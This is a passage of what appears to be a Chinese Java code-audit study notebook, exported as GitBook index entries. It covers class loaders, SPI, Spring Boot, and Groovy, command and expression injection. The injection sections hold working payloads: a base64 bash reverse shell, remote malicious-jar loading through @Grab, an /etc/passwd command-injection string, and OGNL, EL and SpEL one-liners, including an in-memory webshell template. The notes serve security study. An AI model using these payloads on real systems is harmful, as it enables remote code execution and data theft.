如果该方法使用了泛型类没有声明的泛型E，编译器就会报错 只有声明了<>的方法才是泛型方法 public class Generic{ public T getKey(){ return key; } } Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-09-27 14:35:27 "},"03.代码审计/JAVA/01.基础知识/Java类加载器.html":{"url":"03.代码审计/JAVA/01.基础知识/Java类加载器.html","title":"Java类加载器","keywords":"","body":" 转载自JAVA安全基础（一）--类加载器（ClassLoader） - 先知社区 (aliyun.com) 0x01 概念 Java类加载器(Java Classloader)是Java运行时环境(Java Runtime Environment)的一部分，负责动态加载Java类到Java虚拟机的内存空间中，用于加载系统、网络或者其他来源的类文件。Java源代码通过javac编译器编译成类文件，然后JVM来执行类文件中的字节码来执行程序。 0x02 Java类运行 一切的Java类都必须先转换为类字节码然后经过JVM加载后才能运行，而ClassLoader的主要作用就是Java类文件（类字节码）的加载 0x03 应用场景 1、资源隔离 实现不同项目或者同一个项目上的不同版本的jar包隔离，避免集群错误或者冲突的产生。 2、热部署 对于Java应用程序来说，热部署就是在运行时更新Java类文件。在基于Java的应用服务器实现热部署的过程中，类装入器扮演着重要的角色。类装入器不能重新装入一个已经装入的类，但只要使用一个新的类装入器实例，就可以将类再次装入一个正在运行的应用程序。这样我们应用正在运行的时候升级软件，却不需要重新启动应用。 3、代码保护 我们可以对字节码文件进行加密，然后再使用特定的ClassLoader解密文件内容，再加载这些字节码文件。这样就能够实现对我们的代码项目加密保护，别人无法进行反编译查看源代码信息。 0x04 双亲委派 Bootstrap ClassLoader（引导类加载器） 引导类加载器(BootstrapClassLoader)，底层原生代码是C++语言编写，属于jvm一部分，不继承java.lang.ClassLoader类，也没有父加载器，主要负责加载核心java库(即JVM本身)，存储在/jre/lib/rt.jar目录当中 Extension ClassLoader（扩展类加载器） 扩展类加载器(ExtensionsClassLoader)用来在/jre/lib/ext或者java.ext.dirs中指明的目录加载java的扩展库。Java虚拟机会提供一个扩展库目录，此加载器在目录里面查找并加载java类。 App ClassLoader（系统类加载器） 系统类加载器（App ClassLoader）一般通过通过(java.class.path或者Classpath环境变量)来加载Java类，也就是我们常说的classpath路径。 AppClassLoader是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用AppClassLoader加载 获得类对象的类加载器 xxx.class.getClassLoader() 如上图类加载器层次关系，我们可以将其称为类加载器的双亲委派模型。但注意的是，他们之间并不是\"继承\"体系，而是委派体系。当上述特定的类加载器接到加载类的请求时，首先会先将任务委托给父类加载器，接着请求父类加载这个类，当父类加载器无法加载时（其目录搜素范围没有找到所需要的类时），子类加载器才会进行加载使用。这样可以避免有些类被重复加载。 双亲委派好处 1、这样就是能够实现有些类避免重复加载使用，直接先给父加载器加载，不用子加载器再次重复加载。 2、保证java核心库的类型安全。比如网络上传输了一个java.lang.Object类，通过双亲模式传递到启动类当中，然后发现其Object类早已被加载过，所以就不会加载这个网络传输过来的java.lang.Object类 CLassLoader类核心方法 除了上述BootstrapClassLoader，其他类加载器都是继承了CLassLoader类，我们就一起看看其类的核心方法。以下代码都是截取了其方法的源码。 1、loadClass 加载指定的java类 protected Class loadClass(String name, boolean resolve) throws ClassNotFoundException { synchronized (getClassLoadingLock(name)) { // First, check if the class has already been loaded Class c = findLoadedClass(name); if (c == null) { long t0 = System.nanoTime(); try { if (parent != null) { c = parent.loadClass(name, false); } else { c = findBootstrapClassOrNull(name); } } catch (ClassNotFoundException e) { // ClassNotFoundException thrown if class not found // from the non-null parent class loader } if (c == null) { // If still not found, then invoke findClass in order // to find the class. long t1 = System.nanoTime(); c = findClass(name); // this is the defining class loader; record the stats sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); } } if (resolve) { resolveClass(c); } return c; } 在loadClass方法中，它先使用了findLoadedClass(String)方法来检查这个类是否被加载过。 接着使用父加载器调用loadClass（String）方法，如果父加载器为null，类加载器加载jvm内置的加载器。 之后就调用findClass(String) 方法装载类。 最后通过上述步骤我们找到了对应的类，并且接收到的resolve参数的值为true,那么就会调用resolveClass(Class)方法来处理类。 2、findCLass 查找指定的Java类 protected Class findClass(String name) throws ClassNotFoundException { throw new ClassNotFoundException(name); } 3、findLoadedClass 查找JVM已经加载过的类 protected final Class findLoadedClass(String name) { if (!checkName(name)) return null; return findLoadedClass0(name); } 4、defineClass 定义一个Java类，将字节码解析成虚拟机识别的Class对象（就是在JVM中注册该类）。往往和findClass()方法配合使用。 protected final Class defineClass(byte[] b, int off, int len) throws ClassFormatError { return defineClass(null, b, off, len, null); } 5、resolveClass 链接指定Java类 protected final void resolveClass(Class c) { resolveClass0(c); } private native void resolveClass0(Class c); 自定义类加载器过程 因为在实际应用过程中，我们不仅仅只希望使用classpath当中指定的类或者jar包进行调用使用，我们有时希望调用本地磁盘文件或者网络还可以使用自定义类加载器的方式。 在上面loadClass方法分析中，他内部其实是调用findClass(String) 方法来装载类，所以我们要想加载自己自定义的类，就是覆盖这个findClass(String) 方法，而不是loadClass方法。 以下就是自定义类加载器步骤： 1、继承ClassLoader类 2、覆盖findClass()方法 3、在findClass()方法中调用defineClass()方法 这里我们借助一个加密java类字节码例子来讲解。 这里我们先创建一个CypherTest.java文件，然后使用java -d . CypherTest.java，然后就能生成CypherTest.class文件了。 CypherTest.java文件 package com.test; public class CypherTest { public static void main(String[] args) { System.out.println(\"This experiment test is successful\"); } } 目录下生成了CypherTest.class文件。 之后我们编写一个加密类Encryption，使用简单的逐位取反进行加密操作。 package com.testCypher; import java.io.*; public class Encryption { public static void main(String[] args) { encode(new File(\"/usr/local/com/test/CypherTest.class\"), // 获取路径CypherTest.class文件 new File(\"/usr/local/temp/com/test/CypherTest.class\")); // 为了保持一致，创建了一个空的temp目录 } public static void encode(File src, File dest) { FileInputStream fis = null; FileOutputStream fos = null; try { fis = new FileInputStream(src); fos = new FileOutputStream(dest); // 逐位取反操作 int temp = -1; while ((temp = fis.read()) != -1) {// 读取一个字节 fos.write(temp ^ 0xff);// 取反输出 } } catch (IOException e) { } finally { // 关闭数据流 if (fis != null) { try { fis.close(); } catch (IOException e) { e.printStackTrace(); } try { fos.close(); } catch (IOException e) { e.printStackTrace(); } } } System.out.println(\"This experiment test is successful\"); } } 之后我们看到生成了加密后新的CypherTest.class文件。 因为这个是自定义加密后，我们无法使用工具直接进行反编译操作和直接使用jvm默认类加载器去使用它。 之后我们再编写一个Dectyption解密类，对新加密的CypherTest.class进行解密操作。 package com.testCypher; import java.io.ByteArrayOutputStream; import java.io.FileInputStream; import java.io.IOException; import java.io.InputStream; public class Decryption extends ClassLoader { // 继承ClassLoader类 private String rootDir; public Decryption(String rootDir) { this.rootDir = rootDir; } @Override // 重写覆盖findClass protected Class findClass(String className) throws ClassNotFoundException { Class c = findLoadedClass(className); if (c != null) { return c; } else { ClassLoader parent = this.getParent(); try { c = parent.loadClass(className); } catch (ClassNotFoundException e) { // System.out.println(\"父类无法加载你的class，抛出ClassNotFoundException,已捕获，继续运行\"); } if (c != null) { System.out.println(\"父类成功加载\"); return c; } else {// 读取文件 转化成字节数组 byte[] classData = getClassData(className); if (classData == null) { throw new ClassNotFoundException(); } else { // 调用defineClass()方法 c = defineClass(className, classData, 0, classData.length); return c; } } } } public byte[] getClassData(String className) { String path = rootDir + \"/\" + className.replace('.', '/') + \".class\"; // 将流中的数据转换为字节数组 InputStream is = null; ByteArrayOutputStream baos = new ByteArrayOutputStream(); try { is = new FileInputStream(path); byte[] buffer = new byte[1024]; int temp = -1; while ((temp = is.read()) != -1) { baos.write(temp ^ 0xff); } return baos.toByteArray(); } catch (Exception e) { e.printStackTrace(); return null; } finally { if (is != null) { try { is.close(); } catch (IOException e) { e.printStackTrace(); } } if (baos != null) { try { baos.close(); } catch (IOException e) { e.printStackTrace(); } } } } } 这里我们使用将Decryption继承ClassLoader类，之后覆盖findClass()方法，并且在findClass()方法中调用defineClass()方法使用，最后加载我们自定义的getClassData方法去进行解密操作。 最后我们使用一个Demo进行测试，去查看当前类加载器机制的情况。如果我们想要获取其输出的System.out.println语句，需要反射机制去实现。这篇文章我们只学习ClassLoader类应用，就不去涉及其他知识点，获取其类加载器查看即可。 package com.testCypher; public class Demo { public static void main(String[] args) throws ClassNotFoundException { Decryption deLoader = new Decryption(\"/usr/local/temp/\");// 解密加载器 Class t1 = deLoader.loadClass(\"com.test.CypherTest\");// 加载已加密的类 System.out.println(\"c3 的Class是 \" + t1); } } URLClassLoader 除了上述自定义ClassLoader类，我们还可以学习URLClassLoader。URLClassLoader类继承ClassLoader类，可以加载本地磁盘和网络中的jar包类文件。 1. 本地磁盘class文件调用 首先我在D盘创建了一个Test.java文件，写了一段calc.exe计算机弹窗代码。如果文件被成功解析执行，会输出Test success字段且弹出计算器。 package com.test; public class Test { public Test(){ System.out.println(\"Test success!!!\"); try{ Runtime.getRuntime().exec(\"cmd /c calc.exe\"); } catch(Exception e) { e.printStackTrace(); } } } 然后使用javac进行编译，在D盘生成对应的class文件。 之后我们再修改ClassLoaderTest类，利用URLClassLoader方式去获取D盘中Test.class文件。 package com.Classloader; import java.io.File; import java.net.URI; import java.net.URL; import java.net.URLClassLoader; public class ClassLoaderTest { public static void main(String[] args) throws Exception{ File file = new File(\"d:/\"); URI uri = file.toURI(); URL url = uri.toURL(); URLClassLoader classLoader = new URLClassLoader(new URL[]{url}); Class clazz = classLoader.loadClass(\"com.test.Test\"); clazz.newInstance(); } } 这里使用File获取类文件路径，之后使用URLClassLoader获取url地址为D盘，之后使用loadClass方法获取Test.class所含包名，然后实例化。运行发现解析获取到了D盘中Test.class文件。 2. 网络传输class文件调用 之后我们将Test.class放置到电脑的Tomcat服务器目录下，然后启动Tomcat。之后新建个ClassLoaderDemo类网络加载Tomcat服务器中的Test.class. package com.Classloader; import java.net.URL; import java.net.URLClassLoader; public class ClassLoaderDemo { public static void main(String[] args) throws Exception { URL url = new URL(\"http://localhost:8080/examples/\"); URLClassLoader classLoader = new URLClassLoader(new URL[]{url}); Class clazz = classLoader.loadClass(\"com.test.Test\"); clazz.newInstance(); } } 这里使用URLClassLoader加载网络中的Tomcat服务器目录，成功解析获取到了目录下的Test.class文件。 小结 通过ClassLoader类的学习，我们知道不仅仅局限于在ClassPath中类的调用，还能够通过自定义CLassLoader类来加载我们特定的类来操作利用。在安全领域当中，我们往往会使用其ClassLoader特性，自定义恶意的类加载webshell利用以及自定以类字节码的native方法绕过RASP检测。所以了解ClassLoader特性并进行自定义编写，对我们了解java安全机制十分重要。 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-21 22:36:46 "},"03.代码审计/JAVA/01.基础知识/SPI.html":{"url":"03.代码审计/JAVA/01.基础知识/SPI.html","title":"SPI","keywords":"","body":"SPI SPI ，全称为 Service Provider Interface，是Java中用于定义接口，并允许外部模块提供该接口实现的一种机制。应用程序通过 SPI 发现和加载服务提供者（即接口的具体实现）。 package com.yyds; import sun.misc.Service; import java.util.Iterator; import java.util.ServiceLoader; public class Test { public static void main(String[] args) { // sun.misc.Service.providers返回实现了 SPIService 接口的所有服务提供者的迭代器 Iterator providers = Service.providers(SPIService.class); // 遍历实现类执行execute()方法 while(providers.hasNext()) { SPIService ser = providers.next(); ser.execute(); } System.out.println(\"--------------------------------\"); // ServiceLoader.load()查找并加载实现了 SPIService 接口的所有实现类 ServiceLoader load = ServiceLoader.load(SPIService.class); Iterator iterator = load.iterator(); // 遍历实现类执行execute()方法 while(iterator.hasNext()) { SPIService ser = iterator.next(); ser.execute(); } } } 安全性问题 编写一个恶意的服务提供者（接口实现类） 并于服务中注册,从而让应用程序加载并执行恶意代码 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-24 21:20:58 "},"03.代码审计/JAVA/02.基础漏洞/代码注入.html":{"url":"03.代码审计/JAVA/02.基础漏洞/代码注入.html","title":"代码注入","keywords":"","body":"Groovy 基本介绍 Groovy是JVM的一个替代语言（替代是指可以用Groovy在Java平台上进行Java编程） 通过Groovy来达到命令执行demo，test.groovy如下 class test { static void main(args){ def cmd = \"calc\"; println \"${cmd.execute()}\"; } } // 直接命令执行 Runtime.getRuntime().exec(\"calc\") \"calc\".execute() 'calc'.execute() \"${\"calc\".execute()}\" \"${'calc'.execute()}\" // 回显型命令执行 println \"whoami\".execute().text println 'whoami'.execute().text println \"${\"whoami\".execute().text}\" println \"${'whoami'.execute().text}\" def cmd = \"whoami\";println \"${cmd.execute().text}\"; 相关场景 如果外部可控输入Groovy代码或者外部可上传一个恶意的Groovy脚本，且程序并未对输入的Groovy代码进行有效的过滤，那么会导致恶意的Groovy代码注入，从而RCE GroovyShell groovy.lang.GroovyShell可以解析任意Groovy表达式的值和运行任意Groovy脚本 // 解析任意Groovy表达式 import groovy.lang.GroovyShell; public class GroovyShellExample { public static void main( String[] args ) { GroovyShell groovyShell = new GroovyShell(); groovyShell.evaluate(\"\\\"calc\\\".execute()\"); } } // 运行任意Groovy脚本 import groovy.lang.GroovyShell; import groovy.lang.Script; import java.io.File; public class GroovyShellExample { public static void main( String[] args ) throws Exception { //通过加载本地脚本 GroovyShell shell = new GroovyShell(); Script script = shell.parse(new File(\"src/main/java/ysoserial/vulndemo/GroovyTest.groovy\")); script.run(); GroovyShell shell = new GroovyShell(); shell.evaluate(new File(\"src/main/java/ysoserial/vulndemo/GroovyTest.groovy\")); //通过加载远程脚本 GroovyShell shell = new GroovyShell(); shell.evaluate(new URI(\"http://127.0.0.1:8888/GroovyTest.groovy\")); } } GroovyScriptEngine //通过传入根路径之后调用对应的脚本 GroovyScriptEngine scriptEngine = new GroovyScriptEngine(\"src/main/java/ysoserial/vulndemo\"); scriptEngine.run(\"GroovyTest.groovy\", \"\"); //通过调用远程url之后调用特定脚本 GroovyScriptEngine scriptEngine = new GroovyScriptEngine(\"http://127.0.0.1:8888/\"); scriptEngine.run(\"GroovyTest.groovy\", \"\"); //通过Binding加载 GroovyScriptEngine scriptEngine = new GroovyScriptEngine(\"\"); scriptEngine.run(\"src/main/java/ysoserial/vulndemo/GroovyTest.groovy\", new Binding()); GroovyClassLoader //从文件中获取Groovy类 GroovyClassLoader groovyClassLoader = new GroovyClassLoader(); Class aClass = groovyClassLoader.parseClass(new File(\"src/main/java/ysoserial/vulndemo/GroovyTest.groovy\")); GroovyObject object = (GroovyObject) aClass.newInstance(); object.invokeMethod(\"main\", \"\"); //从文本中获取Groovy类 GroovyClassLoader groovyClassLoader = new GroovyClassLoader(); Class aClass = groovyClassLoader.parseClass(\"class GroovyTest {\\n\" + \" static void main(args){\\n\" + \" println \\\"${'whoami'.execute().text}\\\"\\n\" + \"\\n\" + \" }\\n\" + \"}\"); GroovyObject groovyObject = (GroovyObject) aClass.newInstance(); groovyObject.invokeMethod(\"main\", \"\"); ScriptEngine ScriptEngine scriptEngine = new ScriptEngineManager().getEngineByName(\"groovy\"); System.out.println(scriptEngine.eval(\"\\\"whoami\\\".execute().text\")); ByPass @AST注解执行断言 this.class.classLoader.parseClass(''' @groovy.transform.ASTTest(value={ assert Runtime.getRuntime().exec(\"calc\") }) def x '''); @Grab注解加载远程恶意类 //@Grab注解加载远程恶意类 this.class.classLoader.parseClass(\"\"\" @GrabConfig(disableChecksums=true) // 加载依赖会看本地仓库是否有，如果没有就从root服务器的group/module/version目录里面下载EvilJar.jar文件，默认存放在~/.groovy/grapes目录下 @GrabResolver(name=\"Poc\", root=\"http://ip:8888/\") @Grab(group=\"Poc\", module=\"EvilJar\", version=\"0\") import java.lang.String \"\"\"); 远程恶意类 //Poc.java public class Poc{ Poc() throws Exception{ Runtime.getRuntime().exec(\"calc\"); } } //编译成.class文件 javac Poc.java //创建目录 mkdir -p META-INF/services/ //在org.codehaus.groovy.plugins.Runners中写入加载的类名Poc echo Poc > META-INF/services/org.codehaus.groovy.plugins.Runners //将.class文件打包成jar包 jar cvf EvilJar Poc.class META-INF/ //创建放jar包的目录 mkdir -p group/module/version/ //将jar包复制到该目录下 mv EvilJar group/module/version //之后开启http服务 python -m http.server --bind 0.0.0.0 8888 ScriptEngine 基本介绍 javax.script.ScriptEngine类是java自带的用于解析并执行js代码,可以在javascript中执行java代码. 漏洞代码 ScriptEngine engine = new ScriptEngineManager().getEngineByName(\"js\"); Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE); String cmd = String.format(\"load(\\\"%s\\\")\", jsurl); engine.eval(cmd, bindings); jscmd.js var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec(\"calc\");} Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-24 21:19:48 "},"03.代码审计/JAVA/02.基础漏洞/命令注入.html":{"url":"03.代码审计/JAVA/02.基础漏洞/命令注入.html","title":"命令注入","keywords":"","body":"命令执行方法 Runtime // 回显 InputStream in = Runtime.getRuntime().exec(\"whoami\").getInputStream(); Runtime run = Runtime.getRuntime(); Process p = run.exec(cmd); BufferedInputStream in = new BufferedInputStream(p.getInputStream()); // 反弹shell Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}\"); ProcessBuilder InputStream in = new ProcessBuilder(\"whoami\").start().getInputStream(); String[] arrCmd = {\"/bin/sh\", \"-c\", cmd}; ProcessBuilder processBuilder = new ProcessBuilder(arrCmd); Process p = processBuilder.start(); BufferedInputStream in = new BufferedInputStream(p.getInputStream()); ProcessImpl String[] cmds = new String[]{\"whoami\"}; // 需要通过反射获取 Class clazz = Class.forName(\"java.lang.ProcessImpl\"); // ProcessBuilder.start方法是命令执行 Method method = clazz.getDeclaredMethod(\"start\", String[].class, Map.class, String.class, Redirect[].class, boolean.class); method.setAccessible(true); Process e = (Process) method.invoke(null, cmds, null, \".\", null, true); UNIXProcess String[] cmds = new String[]{\"whoami\"}; Class clazz = Class.forName(\"java.lang.UNIXProcess\"); Method start = clazz.getDeclaredMethod(\"start\", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class); start.setAccessible(true); Process process = (Process) start.invoke(null, cmds, null, \".\", null, true); JNI JNI的全称叫做（Java Native Interface），其作用就是让我们的Java程序去调用C的程序。实际上调用的并不是exe程序，而是编译好的dll动态链接库里面封装的方法 定义一个native修饰的方法 使用javah进行编译 编写对应的c语言代码 使用gcc编译成dll文件 编写一个Java类使用System.loadLibrary方法，加载dll文件并且调用 https://www.javasec.org/java-vuls/JNI.html 命令注入漏洞Demo // 参数注入 String[] cmdList = new String[]{\"sh\", \"-c\", \"ls -al \" + filepath}; ProcessBuilder builder = new ProcessBuilder(cmdList); builder.redirectErrorStream(true); Process process = builder.start(); // host注入 String host = request.getHeader(\"host\"); String[] cmdList = new String[]{\"sh\", \"-c\", \"curl\" + host}; ProcessBuilder builder = new ProcessBuilder(cmdList); builder.redirectErrorStream(true); Process process = builder.start(); payload ?filepath=/tmp;cat /etc/passwd 问题 Runtime和ProcessBuilder的底层实际上都是ProcessImpl。而不能执行dir命令的原因是java会对最后的我们传入的cmdstr进行以空格分割，也就是”echo xxx>test.txt”，会被分割会”echo”和”xxx>test.txt”，然后第一部分的”echo”会被当成启动的执行模块，然而在window的系统环境变量中是找不到这个启动模块的（可以在cmd中输入命令“where echo”进行测试）,所以运行后才会抛出“系统找不到指定文件”错误。 解决：windows加上cmd /c，Linux使用base64编码 修复代码 主要是因为可以通过命令分隔符来执行多条命令 该项目中给出的修复方法为通过正则只允许输入大小写字母、数字、下划线、斜杠、点和短横线 private static final Pattern FILTER_PATTERN = Pattern.compile(\"^[a-zA-Z0-9_/\\\\.-]+$\"); public static String cmdFilter(String input) { if (!FILTER_PATTERN.matcher(input).matches()) { return null; } return input; } Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-24 21:17:01 "},"03.代码审计/JAVA/02.基础漏洞/模板注入.html":{"url":"03.代码审计/JAVA/02.基础漏洞/模板注入.html","title":"模板注入","keywords":"","body":"Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-26 15:37:53 "},"03.代码审计/JAVA/02.基础漏洞/表达式注入.html":{"url":"03.代码审计/JAVA/02.基础漏洞/表达式注入.html","title":"表达式注入","keywords":"","body":" 什么是表达式呢？其实通俗的说就是一个帮助我们更方便操作Bean等对象的式子 // 正常Java代码 String name = MyUser.getName() // 表达式写法 #MyUser.name OGNL https://j0k3r.top/2020/08/19/java-ognl/#0x01-OGNL-Object-Graph-Navigation-Library struct2通过ognl表达式来执行命令 Expression 表达式 root 根对象，即操作对象 context 上下文，用来保存对象运行的属性及其值，有点类似于运行环境的意思，保存了环境变量 Demo Hacker hacker = new Hacker(); hacker.setName(\"hacker\"); // 创建Context并传入root OgnlContext context = new OgnlContext(); context.setRoot(hacker) // 创建Expression String expression = \"hacker.name\"; Object ognl = Ognl.parseExpression(expression); // 调用 Object value = Ognl.getValue(ognl,context,context.getRoot()); System.out.println(\"result:\" + value); rce // 创建一个OGNL上下文对象 OgnlContext context = new OgnlContext(); // getValue() 触发 // @[类全名(包括包路径)]@[方法名|值名] Ognl.getValue(\"@java.lang.Runtime@getRuntime().exec('/Applications/Calculator.app/Contents/MacOS/Calculator')\", context, context.getRoot()); // getValue() 使用 new Ognl.getValue(\"(new java.lang.ProcessBuilder(new java.lang.String[]{\\\"/Applications/Calculator.app/Contents/MacOS/Calculator\\\"}).start())\", context, context.getRoot()); // setValue() 触发 Ognl.setValue(\"(\\\"@java.lang.Runtime@getRuntime().exec(\\'/Applications/Calculator.app/Contents/MacOS/Calculator\\')\\\")(a)(b)\",context,\"\"); EL EL表达式可以在JSP或JSF页面中直接嵌入，以便更方便地获取和操作Java对象的数据。 exec一句话回显 ${pageContext.setAttribute(\"inputStream\", Runtime.getRuntime().exec(\"cmd /c dir\").getInputStream());Thread.sleep(1000);pageContext.setAttribute(\"inputStreamAvailable\", pageContext.getAttribute(\"inputStream\").available());pageContext.setAttribute(\"byteBufferClass\", Class.forName(\"java.nio.ByteBuffer\"));pageContext.setAttribute(\"allocateMethod\", pageContext.getAttribute(\"byteBufferClass\").getMethod(\"allocate\", Integer.TYPE));pageContext.setAttribute(\"heapByteBuffer\", pageContext.getAttribute(\"allocateMethod\").invoke(null, pageContext.getAttribute(\"inputStreamAvailable\")));pageContext.getAttribute(\"inputStream\").read(pageContext.getAttribute(\"heapByteBuffer\").array(), 0, pageContext.getAttribute(\"inputStreamAvailable\"));pageContext.setAttribute(\"byteArrType\", pageContext.getAttribute(\"heapByteBuffer\").array().getClass());pageContext.setAttribute(\"stringClass\", Class.forName(\"java.lang.String\"));pageContext.setAttribute(\"stringConstructor\", pageContext.getAttribute(\"stringClass\").getConstructor(pageContext.getAttribute(\"byteArrType\")));pageContext.setAttribute(\"stringRes\", pageContext.getAttribute(\"stringConstructor\").newInstance(pageContext.getAttribute(\"heapByteBuffer\").array()));pageContext.getAttribute(\"stringRes\")} jsEngine 回显 ${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"var+s=[3];s[0]=\\\"cmd\\\";s[1]=\\\"/c\\\";s[2]=\\\"whoami\\\";var+p=java.lang.Runtime.getRuntime().exec(s);var+sc=new+java.util.Scanner(p.getInputStream(),\\\"GBK\\\").useDelimiter(\\\"\\\\\\\\A\\\");var+result=sc.hasNext()?sc.next():\\\"\\\";sc.close();result;\")} SPEL https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/ 专门用于spring框架的EL表达式 RCE String cmdStr = \"new java.lang.ProcessBuilder(new String[]{\\\"calc\\\"}).start()\"; ExpressionParser parser = new SpelExpressionParser();//创建解析器 Expression exp = parser.parseExpression(cmdStr);//解析表达式 System.out.println( exp.getValue() );//弹出计算器 // T()操作符会返回一个object , 它可以帮助我们获取某个类的静态方法 , 用法T(全限定类名).方法名() String cmdStr = \"T(java.lang.Runtime).getRuntime().exec('calc')\"; ExpressionParser parser = new SpelExpressionParser();//创建解析器 Expression exp = parser.parseExpression(cmdStr);//解析表达式 System.out.println( exp.getValue() );//弹出计算器 String cmdStr = \"T(javax.script.ScriptEngineManager).getEngineByName(\\\"nashorn\\\").eval(\\\"s=[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);\\\")\"; ExpressionParser parser = new SpelExpressionParser();//创建解析器 Expression exp = parser.parseExpression(cmdStr);//解析表达式 System.out.println( exp.getValue() );//弹出计算器 内存马注入 T(org.springframework.cglib.core.ReflectUtils).defineClass('InceptorMemShell',T(org.springframework.util.Base64Utils).decodeFromString('base64内存马'),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance() JXPATH JXPath支持标准的XPath函数，开箱即用。它还支持 \"标准 \"扩展函数，这些函数基本上是通往Java的桥梁，以及完全自定义的扩展函数. String firstName = (String)context.getValue(\"getAuthorsFirstName($book)\"); //官方demo，等价于调用$book.getAuthorsFirstName()方法 如果我们想要执行 Runtime.getRuntime().exec(\"open -na Calculator\") 按照上面的例子其实就改为了 exec(java.lang.Runtime.getRuntime(),'open -na Calculator') GeoServer 属性名表达式前台代码执行payload exec(java.lang.Runtime.getRuntime(),'touch /tmp/success2') JEXL Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-26 15:45:25 "},"03.代码审计/JAVA/03.JavaWeb了解/Spring.html":{"url":"03.代码审计/JAVA/03.JavaWeb了解/Spring.html","title":"Spring","keywords":"","body":"SSM（SpringMVC + Spring + MyBatis） SpringMVC代替Struts2 MyBatis代替Hibernate Spring并不是一个新的web框架，而是作者认为java的框架已经足够多且功能完善，只需要一个“工具”将他们整合起来即可，因此spring诞生了。 Spring最重要的两个思想IOC(DI)和AOP： IOC(DI)即控制反转（依赖注入），这里的控制指的是对类实例化的控制，反转是指通常类的实例化是由开发人员完成的，现在将这个权利给予容器（这里就是spring），告诉容器实例化类的方法，在使用时可以直接调用，降低的代码的耦合度和量，同时也增加了程序的可读性。 AOP即面向切面编程，简单理解就是将各个模块公用的模块（如打日志）抽出来，也可以降低代码的耦合度。 Spring Boot Spring Boot 是对 Spring 工作流层面的演进，实现基于 Spring 的更便捷的生产级别应用。 Spring Boot 的优点： 内嵌 Servlet 容器，独立运行的 Spring 项目，Spring Boot 可以内嵌 Tomcat，以 java -jar xx.jar 包的形式来运行一个 Spring Boot 应用，省略了 war 包部署的繁琐。 提供 starter 机制简化 Maven 依赖管理与 Spring 配置，如仅需要引入“spring-boot-starter-web”就可以包含 Spring 和 SpringMVC 相关的依赖和配置。 项目结构 过滤器（Filter）和 拦截器（Interceptor ) 的区别_filter_security_interceptor-CSDN博客 另外还要注意POM.xml pom.xml： Maven 构建说明文件（管理项目依赖） spring-boot项目特有的标签 org.springframework.boot spring-boot-starter-parent 2.2.2.RELEASE 有了这个，当前的项目才是 Spring Boot 项目，spring-boot-starter-parent 是一个特殊的 starter ，它用来提供相关的Maven默认依赖。使用它之后，常用的包依赖就可以省去 version 标签，关于具体 Spring Boot 提供了哪些 jar 包的依赖，我们可以查看本地 Maven 仓库下：\\repository\\org\\springframework\\boot\\spring-boot-dependencies\\2.2.2.RELEASE\\spring-boot-dependencies-2.2.2.RELEASE.pom 文件来查看 比如说spring boot内置了Tomcat作为默认的Servlet容器，2.2.2版本对应的Tomcat版本为9.0.29。 项目配置文件在src/main/resources目录下 application.properties或者application.yml 应用入口类 Spring Boot 项目通常有一个名为 Application 的入口类，入口类里有一个 main 方法， *这个 main 方法其实就是一个标准的 Java 应用的入口方法。 请求传递流程 为了更好理解，以「保存订单」功能为例，主要的请求流程如下图，不了解Spring请求传递的同学可以在代码中跟一遍请求流程，会加深请求传递的印象。 注解 @SpringBootApplication: 用于标识主类，表明这是一个 Spring Boot 应用程序的入口点。它组合了 @Configuration、@EnableAutoConfiguration 和 @ComponentScan 注解。 @RestController: 标识一个类为 RESTful 风格的控制器，用于处理 HTTP 请求并返回响应。 @RequestMapping: 定义请求的 URL 路径，可用于类级别或方法级别。用于映射 HTTP 请求到相应的控制器方法。 @GetMapping, @PostMapping, @PutMapping, @DeleteMapping: 分别用于标识 GET、POST、PUT 和 DELETE 请求的处理方法。 @RequestBody: 用于将请求体的内容绑定到方法参数上，通常用于接收 JSON 或 XML 数据。 @PathVariable: 用于从 URL 路径中获取变量值，并将其绑定到方法参数上。 @RequestParam: 用于获取请求参数的值，并将其绑定到方法参数上。 @Autowired: 自动装配依赖项，通过类型来查找匹配的 bean，并注入到字段、构造函数或方法参数中。 @Value: 用于将属性值注入到字段、构造函数或方法参数中。 @Configuration: 声明一个类作为配置类，用于定义 bean 的创建和配置。 @Component: 标识一个类为 Spring 组件，会被自动扫描并创建为 bean。 @Service: 标识一个类为服务层组件，通常用于注解业务逻辑的实现类。 @Repository: 标识一个类为数据访问层组件，通常用于注解数据库操作的实现类。 @EnableAutoConfiguration: 开启自动配置功能，Spring Boot 会根据项目的依赖和配置自动进行相应的配置。 @Conditional: 根据条件来决定是否创建某个 bean 或执行某段代码。 在application.yml中添加 server: port: 8080 servlet: context-path: / name: Khaz age: 18 content: \"name${name},age${age}\" 新建HelloController类 @RestController public class HelloController { @Value(\"${age}\") private Integer age; @Value(\"${name}\") private String name; @RequestMapping(value = \"/hello\") public String get(){ return name + \":\"+age; } } @RestController所以数据格式为json格式 运行jsp 依赖 org.apache.tomcat.embed tomcat-embed-jasper 8.5.28 javax.servlet javax.servlet-api javax.servlet jstl 主流的目录结构 非必须，配置好视图路径前缀即可 └─WEBAPP └─WEB-INF 